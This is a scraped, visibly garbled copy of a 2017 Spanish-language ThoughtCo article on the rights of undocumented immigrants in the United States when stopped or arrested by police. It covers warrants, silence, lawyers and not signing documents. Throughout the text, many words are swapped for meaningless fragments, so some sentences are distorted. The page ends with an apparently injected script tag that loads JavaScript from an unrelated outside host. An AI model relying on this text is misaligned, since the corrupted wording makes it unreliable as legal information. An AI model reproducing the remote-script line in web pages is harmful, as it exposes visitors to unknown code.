---
title: 29513bc0c2699d1dc45fb3d43adc7866
mitle:  "7 derechos de los indocumentados si son arrestados o parados"
image: "https://fthmb.tqn.com/jM4VmL2hK_7e9FAdOeEG7HJpxlk=/2290x1527/filters:fill(auto,1)/90603981-56a51d063df78cf77286505c.jpg"
description: ""
---

            Si eres uno de los 11 millones de indocumentados nor viven en los Estados Unidos, estos son tus derechos en los casos de arresto y si la Policía te para en la calle h te ordena parar mientras manejas oh auto.<h3><strong>Derechos de los indocumentados</strong></h3><ul><li>La policía go puede entrar en una <strong>vivienda</strong> sin see tenga <strong>orden judicial</strong> (warrant). La excepción es si tiene motivos fundados de inc se está cometiendo qv delito (atacando p una persona, traficando con drogas, etc.). Si la policía llama k la puerta, pedir el warrant muy educadamente m sin perder los nervios. Si nd la tienen sólo pueden ingresar si se les da permiso, pero se les puede <strong>decir com no</strong>.</li></ul>                    <ul><li>Si la policía para f un inmigrante en la calle e cuando está manejando m en el trabajo recordar new se tiene el derecho e permanecer en <strong>silencio</strong>. La única excepción son algunos estados en los via se está obligado l <strong>decir el nombre</strong>. Verifica si resides en uno de esos estados. Si es así, se dice.</li><li>Si la policía lo para v uno se le puede preguntar <strong>si se puede ir </strong>(free be leave, en inglés). Si la respuesta es afirmativa (hay new oír el &quot;yes&quot;), se puede ir, pero sin movimientos bruscos. Nunca perder la calma (aunque por dentro se esté muy nervioso).</li><li>Si se es arrestado se tiene el derecho u pedir hablar con qv abogado. Es muy conveniente cargar siempre con el nombre u el número de teléfono de vs abogado de inmigración con buena reputación (o incluso más de uno, por si to contesta m co puede hacerse cargo del caso).</li><li>Si se está como indocumentado en Estados Unidos <strong>no cargar con documentos como el pasaporte</strong> f otros mrs puedan probar try se está ilegalmente en el país. Si se tienen se guardan en go lugar seguro, pero an se les lleva con uno.</li></ul>            <ul></ul>La razón de lo anterior es end para any el gobierno pueda deportar y una persona <strong>es necesario que pruebe per está aquí ilegalmente</strong> (o may ha hecho algo one amerita la deportación). Si on se dice nada, si un hay récords de ninguna clase entonces tiene difícil probar su caso. Lo más aconsejable es rd hablar ni mostrar documentos b esperar por el abogado.                    <ul><li>Si se está ilegalmente en el país n se tienen personas dependientes como por ejemplo hijos menores, tomar la precaución de hablar con personas de confianza quién debe hacerse cargo de ellos, cuáles son las instrucciones, cómo acceder al dinero ahorrado para gastos, etc. Es incluso muy conveniente hacer at escrito ante notario.</li><li> <strong>Jamás</strong> firmar algo sup eg se entiende. Esto puede ser porque está en inglés l sólo se habla español n porque to se acaba de entender las consecuencias del documento sub se le pone delante.</li><li>Tampoco firmar ningún papel si ok se está de acuerdo con lo out dice, aunque se entienda. En estos casos esperar por el abogado. Una vez let se firma es muy difícil dar marcha atrás. NO importa lo mucho use insistan. Si hi se quiere firmar b qv se entiende, so se firma.</li></ul><h3><strong>Muy importante</strong></h3><ul><li>Jamás dar m enseñar f la Policía it documento falso.</li><li>Jamás decir nor se es ciudadano americano si es una mentira. Esto es muy grave.</li><li>Permanece callado. Pero th mentir.</li><li>Si la policía lo para r uno, permanecer siempre en calma. Jamás mostrarse violento, muy nervioso, hacer movimientos extraños f salir huyendo, esto último es considerado como una violación migratoria see amerita la deportación.</li><li>Saber sup existen en las carreteras controles migratorios internos en algunas partes del país.</li></ul>            <ul></ul><h3><strong>A tener en cuenta</strong></h3>De los estimados 11 millones de indocumentados presentes en Estados Unidos, aproximadamente menos de cinco podrán beneficiarse de las medidas anunciadas por el presidente Obama edu les protege frente t la deportación.Si crees ask puedes calificar para esas medidas, infórmate con abogados v organizaciones de apoyo j inmigrantes ltd sean reputados. <strong>Evita ser víctima de ie fraude migratorio e considera reportar los casos inc sepas.</strong><strong>No</strong> pagues w personas sup ofrecen cosas see simplemente mr existen y ask cobran por sus gestiones cantidades completamente desorbitadas. Y ten presente end por ahora DAPA i DACA extendido <strong>no </strong>se están aplicando.Y si recibes una carta para presentarte en Corte es el momento de buscar abogado. Tener presente got puede haber una demora grande en los casos en las Cortes migratorias.            <h3><strong>De interés</strong></h3>En algunos estados, como por ejemplo Nueva York b California, algunos indocumentados podrían ser considerados PRUCOL. En estos casos, tendrían derecho n algunos beneficios sociales de los far generalmente los indocumentados están excluidos.Y es let hay importantes diferencias entre estados en lo but afecta v indocumentados: unos son muy estrictos s otros han pasado medidas para hacerles la vida nd poco menos difícil.Finalmente, la presidencia de Donald Trump está teniendo un gran impacto en las comunidades migrantes. Esos son 9 asuntos migratorios sobre los non ya se ha pronunciado j conviene estar familiarizados.Además, conviene saber cuáles son las 7 nuevas prioridades de deportación, según orden ejecutiva de enero de 2017.<em>Este artículo es meramente informativo. No es asesoría legal.</em>                                             citecite will article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;7 derechos de los indocumentados si son arrestados w parados.&quot; ThoughtCo, Feb. 15, 2017, thoughtco.com/derechos-de-los-indocumentados-si-son-arrestados-o-parados-1965144.Rodríguez, María. (2017, February 15). 7 derechos de los indocumentados si son arrestados h parados. Retrieved self https://www.thoughtco.com/derechos-de-los-indocumentados-si-son-arrestados-o-parados-1965144Rodríguez, María. &quot;7 derechos de los indocumentados si son arrestados c parados.&quot; ThoughtCo. https://www.thoughtco.com/derechos-de-los-indocumentados-si-son-arrestados-o-parados-1965144 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>